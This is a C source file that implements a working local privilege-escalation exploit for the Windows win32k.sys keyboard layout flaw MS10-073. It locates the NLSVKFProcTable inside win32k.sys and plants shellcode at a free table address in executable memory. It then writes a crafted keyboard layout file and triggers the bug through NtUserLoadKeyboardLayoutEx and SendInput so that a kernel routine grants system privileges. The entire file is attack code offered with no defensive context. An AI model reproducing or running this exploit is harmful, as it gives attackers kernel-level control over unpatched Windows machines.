#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <tlhelp32.h>

#include "ntdll.h"
#include "utils.h"
#include "zdisasm.h"
#include "ms10_073.h"
#include "kernelshell.h"

PDWORD ExploitWin32kKeyboardLayoutSearchNLSVKFProcTable(PVOID pMap)
{
	PDWORD pNlsNullProc = NULL;
	DWORD dwLen;

	PIMAGE_NT_HEADERS pPE = RtlImageNtHeader(pMap);
	if (pPE)
	{
		PIMAGE_SECTION_HEADER pCodeSection = SearchSection(pMap,".text");
		if (pCodeSection)
		{
			PIMAGE_SECTION_HEADER pDataSection = SearchSection(pMap,".data");
			if (pDataSection)
			{
				UCHAR ucSignature[] = {0x91,0x00,0x03,0x01,0x90,0x00,0x13,0x01};

				PUCHAR pPointer = (PUCHAR)pDataSection->PointerToRawData + (DWORD)pMap;
				for (DWORD i = 0; i < pDataSection->SizeOfRawData; i++, pPointer++)
				{
					if (!memcmp(pPointer,&ucSignature,sizeof(ucSignature)))
					{
						DWORD dwCodeStart = pCodeSection->VirtualAddress + pPE->OptionalHeader.ImageBase;

						pPointer -= 0x1000;
						for (i = 0; i < 0x1000; i++, pPointer++)
						{
							if (*(PDWORD)pPointer >= dwCodeStart && *(PDWORD)pPointer < dwCodeStart + pCodeSection->SizeOfRawData)
							{
								if (*(PDWORD)pPointer == *(PDWORD)(pPointer + 8) && *(PDWORD)pPointer != *(PDWORD)(pPointer + 4))
								{
									if (*(PDWORD)pPointer != *(PDWORD)(pPointer + 12))
									{
										DWORD dwOffset = RvaToOffset(pPE,*(PDWORD)pPointer - pPE->OptionalHeader.ImageBase);
										if (dwOffset)
										{
											PUCHAR pCode = (PUCHAR)(dwOffset + (DWORD)pMap);

											for (DWORD j = 0; j < 10; j++)
											{
												if (*(PWORD)pCode == 0x0CC2)
												{
													PUCHAR pNextPointer = pPointer + 12;

													for (DWORD c = 0; c < 0x1000; c++, pNextPointer++)
													{
														if (*(PDWORD)pNextPointer == *(PDWORD)pPointer)
														{
															if (*(PDWORD)pPointer != *(PDWORD)(pNextPointer - 8) && *(PDWORD)pPointer != *(PDWORD)(pNextPointer + 8))
															{
																pNlsNullProc = (PDWORD)pNextPointer;

																break;
															}
														}
													}

													break;
												}

												GetInstLength((PDWORD)pCode,&dwLen);
												pCode += dwLen;
											}
										}
									}
								}
							}

							if (pNlsNullProc) break;
						}

						break;
					}
				}
			}
		}
	}

	return pNlsNullProc;
}

PVOID ExploitWin32kSearchNtUserLoadKeyboardLayoutEx()
{
	PVOID pNtUserLoadKeyboardLayoutEx = NULL;
	PUCHAR pLoadKeyboardLayoutW = (PUCHAR)GetProcAddress(LoadLibrary("user32.dll"),"LoadKeyboardLayoutW");
	DWORD dwLen;

	if (pLoadKeyboardLayoutW)
	{
		for (DWORD i = 0; i < 50; i++)
		{
			if (*pLoadKeyboardLayoutW == 0xE8)
			{
				PUCHAR pFunc = *(DWORD*)(pLoadKeyboardLayoutW + 1) + pLoadKeyboardLayoutW + 5;
				for (DWORD j = 0; j < 200; j++)
				{
					if (*pFunc == 0xE8)
					{
						PUCHAR pFunc1 = *(DWORD*)(pFunc + 1) + pFunc + 5;
						for (DWORD c = 0; c < 50; c++)
						{
							if (*(WORD*)pFunc1 == 0x15FF)
							{
								if (**(PVOID**)(pFunc1 + 2) == GetProcAddress(GetModuleHandle("ntdll.dll"),"RtlInitUnicodeString"))
								{
									PUCHAR pFunc2 = pFunc1 + 6;
									for (DWORD n = 0; n < 20; n++)
									{
										if (*pFunc2 == 0xE8)
										{
											pNtUserLoadKeyboardLayoutEx = *(DWORD*)(pFunc2 + 1) + pFunc2 + 5;

											break;
										}

										GetInstLength((PDWORD)pFunc2,&dwLen);
										pFunc2 += dwLen;
									}
								}

								break;
							}

							GetInstLength((PDWORD)pFunc1,&dwLen);
							pFunc1 += dwLen;
						}
					}

					if (pNtUserLoadKeyboardLayoutEx) break;

					GetInstLength((PDWORD)pFunc,&dwLen);
					pFunc += dwLen;
				}

				break;
			}

			GetInstLength((PDWORD)pLoadKeyboardLayoutW,&dwLen);
			pLoadKeyboardLayoutW += dwLen;
		}
	}

	return pNtUserLoadKeyboardLayoutEx;
}

unsigned char cNewKeyboardLayout[] = {
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x2e,0x64,0x61,0x74,0x61,0x00,0x00,0x00,0xe6,0x00,0x00,0x00,
0x60,0x01,0x00,0x00,0xe6,0x00,0x00,0x00,0x60,0x01,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x94,0x01,0x00,0x00,0x9e,0x01,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xa6,0x01,0x00,0x00,0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x01,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x01,0x00,0x00,0x00,0xc2,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00};

__declspec(naked) VOID KbdShellcode_start()
{
	__asm
	{
		mov eax,0x11111111
		call eax
		xor eax,eax
		inc eax
		retn 0x0C
	}
}

__declspec(naked) VOID KbdShellcode_end(){__asm __emit 'K'}

#define	KbdShellcode_Size	(DWORD)KbdShellcode_end - (DWORD)KbdShellcode_start

BOOL ExploitWin32kKeyboardLayoutAllocShellcode(LPSTR lpLayoutFile,PVOID pvR0Func)
{
	CHAR SysDir[MAX_PATH];
	CHAR Win32k[MAX_PATH];
	BOOL bRet = FALSE;
	DWORD dwSize;

	GetSystemDirectory(SysDir,RTL_NUMBER_OF(SysDir)-1);
	PathCombine(Win32k,SysDir,"win32k.sys");

	PVOID pMap = MapBinary(Win32k,GENERIC_READ,FILE_ATTRIBUTE_NORMAL,PAGE_READONLY,FILE_MAP_READ,&dwSize);
	if (pMap)
	{
		PDWORD pNLSVKFProcTable = ExploitWin32kKeyboardLayoutSearchNLSVKFProcTable(pMap);
		if (pNLSVKFProcTable)
		{
			for (BYTE bIndex = 0; bIndex <= 255; bIndex++)
			{
				if (pNLSVKFProcTable[bIndex] < 0x7FFF0000 && pNLSVKFProcTable[bIndex] > 0x10000)
				{
					MEMORY_BASIC_INFORMATION MemoryBasicInfo;

					if (VirtualQuery((LPCVOID)pNLSVKFProcTable[bIndex],&MemoryBasicInfo,sizeof(MemoryBasicInfo)) == sizeof(MEMORY_BASIC_INFORMATION))
					{
						if (MemoryBasicInfo.State == MEM_FREE)
						{
							DWORD dwAllocSize = 0x1000;
							PVOID pBaseAddress = (PVOID)pNLSVKFProcTable[bIndex];

							if (NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(),&pBaseAddress,0,&dwAllocSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)))
							{
								if (!IsBadWritePtr((PVOID)pNLSVKFProcTable[bIndex],KbdShellcode_Size))
								{
									CopyMemory((PVOID)pNLSVKFProcTable[bIndex],KbdShellcode_start,KbdShellcode_Size);
									FixDWORD((PBYTE)pNLSVKFProcTable[bIndex],KbdShellcode_Size,0x11111111,(DWORD)pvR0Func);

									CHAR chTempPath[MAX_PATH];

									GetTempPath(sizeof(chTempPath)-1,chTempPath);
									GetTempFileName(chTempPath,NULL,0,lpLayoutFile);

									cNewKeyboardLayout[0x01C3] = bIndex;

									if (FileWrite(lpLayoutFile,CREATE_ALWAYS,cNewKeyboardLayout,sizeof(cNewKeyboardLayout)))
									{
										bRet = TRUE;

										break;
									}
								}

								VirtualFree(pBaseAddress,0,MEM_RELEASE);
							}
						}
					}
				}
			}
		}

		UnmapViewOfFile(pMap);
	}

	return bRet;
}

BOOL ExploitMS10_073()
{
	BOOL bRet = FALSE;
	CHAR chLayoutFile[MAX_PATH];

	DbgPrint(__FUNCTION__"(): start\n");

	if (ExploitWin32kKeyboardLayoutAllocShellcode(chLayoutFile,(PVOID)KernelGetSystemPrivileges))
	{
		typedef NTSTATUS(NTAPI*funcNtUserLoadKeyboardLayoutEx)(HANDLE Handle,DWORD offTable,PUNICODE_STRING puszKeyboardName,HKL hKL,PUNICODE_STRING puszKLID,DWORD dwKLID,UINT Flags);
		funcNtUserLoadKeyboardLayoutEx NtUserLoadKeyboardLayoutEx = (funcNtUserLoadKeyboardLayoutEx)ExploitWin32kSearchNtUserLoadKeyboardLayoutEx();
		if (NtUserLoadKeyboardLayoutEx)
		{
			LPWSTR wszUserKLID = L"00008009";
			UNICODE_STRING usKLID;
			UNICODE_STRING usKeyboardName;
			DWORD Flags	= 0x101;
			DWORD dwKLID = 0x80098009;
			DWORD offTable = 0x01ae0160;

			usKLID.Buffer = wszUserKLID;
			usKLID.Length = wcslen(wszUserKLID) * 2;
			usKLID.MaximumLength = usKLID.Length + 2;

			usKeyboardName.Buffer = L"";
			usKeyboardName.Length = 0;
			usKeyboardName.MaximumLength = 0;

			HKL hKL = GetKeyboardLayout(GetCurrentThreadId());

			HANDLE hFile = CreateFileA(chLayoutFile,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);  
			if (hFile != INVALID_HANDLE_VALUE)
			{
				INPUT Key;

				ZeroMemory(&Key,sizeof(Key));

				NtUserLoadKeyboardLayoutEx(hFile,offTable,&usKeyboardName,hKL,&usKLID,dwKLID,Flags);

				ActivateKeyboardLayout(hKL,Flags);

				Key.type = 1;
												
				SendInput(1,&Key,sizeof(Key));

				bRet = bKernelCode;

				CloseHandle(hFile);
			}
		}

		DeleteFile(chLayoutFile);
	}

	DbgPrint(__FUNCTION__"(): %s\n",bRet ? "OK" : "failed");

	return bRet;
}